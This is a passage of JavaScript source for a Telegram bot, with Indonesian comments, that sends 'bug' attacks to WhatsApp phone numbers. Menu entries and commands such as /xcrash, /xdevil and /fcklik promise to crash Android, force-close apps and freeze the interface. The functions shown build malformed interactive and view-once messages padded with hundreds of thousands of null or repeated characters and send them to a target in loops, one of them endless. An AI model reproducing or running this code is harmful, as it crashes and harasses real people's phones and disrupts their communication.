...
│ ↯ /xflower 62××       ☇ DELAY FOR MURBUG
│ ↯ /xperma 62××       ☇ DELAY HARD BEBAS SPAM
│ ↯ /xshow 62××       ☇ DELAY FOR MURBUG
╰──────────────────────╯
...
│ ↯ /xcrash 62××       ☇ CRASH ANDROID
│ ↯ /fcklik 62××       ☇ FORCECLOSE KLIK 
│ ↯ /Xsystem 62××       ☇ BLANK SYSTEM NOTIF
│ ↯ /xdevil 62××       ☇ BLANK FREEZE UI
└────────────────────────╯
...
// /update [repoOptional]
// download update_index.js -> replace local base.js -> restart
bot.command("update", async (ctx) => {
  try {
    ...
    // backup base.js lama
    try {
      const backup = path.join(process.cwd(), "base.backup.js");
...
bot.command("dellfile", async (ctx) => {
  try {
    ...
    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate base.js");
    }
...
bot.command("fcklik", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /fcklik 62xx");
...
bot.command("xdevil", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /xdevil 62xx");
...
`,
    ...
    (async () => {
      for (let r = 0; r < 5; r++) {
        try {
          await Functionxdevil(sock, target)
          await sleep(3000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
...
`,
    {
      ...
      reply_markup: {
        inline_keyboard: [
          [
            { text: "(ᥫ᭡) 𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "4956461073550017373" }
          ]
        ]
      }
    }
...
bot.command("xflower", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /xflower 62xx"); 
...
`,
  ...
  (async () => {
    try {
      for (let r = 0; r < 60; r++) {
        await VnXNewDelayHardPerma(sock, target)
...
`,
  ...
  (async () => {
    try {
      for (let r = 0; r < 40; r++) {
        await VnXDelayHardContact(sock, target)
        await sleep(400);
      }
    } catch (err) {
      console.error("Error high:", err);
...
bot.command("X", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /X 62xx"); 
...
// akhir function freeze\\


//kumpulan function blank\\
...
///apaan kek\\\
async function Functionxdevil(sock, target) {
    for (let r = 0; r < 1; r++) {
          await await freezeButtons(sock, target)
          await sleep(2000)
          await await XTVcuy(sock, target);
          await freeze(sock, target)
          await sleep(600)
          await ComboXTV(sock, target)
    }
}
// akhir pemanggilannya function combo\\



// ------------ (  FUNCTION BUGS ) -------------- \\
async function ComboXTV(sock, target) {
  const payload1 = {
    interactiveMessage: {
      body: { text: "Rafi Payment" },
      nativeFlowMessage: {
        buttons: [{
          name: "payment_info",
  ...
  try {
    ...
    console.log("Berhasil terkirim dengan stabil.");
  } catch (err) {
    console.log("Gagal, coba kurangi jumlah .repeat() nya:", err.message);
  }
}
...
async function VnXNewStuckLogo(sock, target) {
  const interactivePayload = {
    interactiveMessage: {
      ...
      footer: {
        text: "XTV Yg Sekarang Bukan Yg Dulu"
      },
      nativeFlowMessage: {
        buttons: [
          {
          ...
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "XTV Anti Ampas",
              copy_code: "XTV Anti Ampas",
            }),
          }
        ]
      }
  ...
  const viewOncePayload = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ampas lu kontol" + "\u0000".repeat(999999),
          canonicalUrl: "https://t.me/R4f14ndr4",
          description: "blonde",
          title: "XTV",
          contentText: "\u0000".repeat(999999)
        }
      }
    }
  };
  ...
  try {
    await sock.relayMessage(target, interactivePayload, { participant: { jid: target } });
    await sock.relayMessage(target, viewOncePayload, { participant: { jid: target } });
    console.log("Stuck logo dan payload berhasil dikirim ke:", target);
  } catch (error) {
        ...
        buttons: [
          {
           ...
           name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "XTV Frezee" + "ꦾ".repeat(60000),
              url: "https://t.me/R4f14ndr4" + "ꦽ".repeat(250000),
              }),
          }
        ]
      }
...
async function sendButtonMessage(sock, target) {
  ...
  // Mengirim pesan dengan tombol ke target
...
async function tolol(sock, target) {
    await sock.relayMessage(target, {
        interactiveResponseMessage: {
            body: {
                text: "RapTheLight" + "\u0000".repeat(300000),
                format: 1
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
        ...
        timestamp: Date.now(),
        messageId: `XTV-${Date.now()}-${Math.random().toString(36).slice(2)}`,
        raw: true,
        priority: "high"
    });

    return { status: "TERKIRIM", dev: "@R4f14ndr4", ai: "XTV AI CANGGIH🔥" };
}
...
          caption: "XTV Bng" + "ꦽꦾ".repeat(250000),
...
async function VnXNewDelayHardPerma(sock, target) {
  while (true) {
    const mbgvnxnew = {
      groupStatusMessageV2: {
        message: {
...
async function CrashMakLo(target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "👉 ORANG LAIN TAKUT MENCOBA... TAPI KAMU BERBEDA KAN? BUKA BUKTI KEKUATANNYA DI SINI! 🚀😈"
            },
            nativeFlowMessage: {
              buttons: [
                {
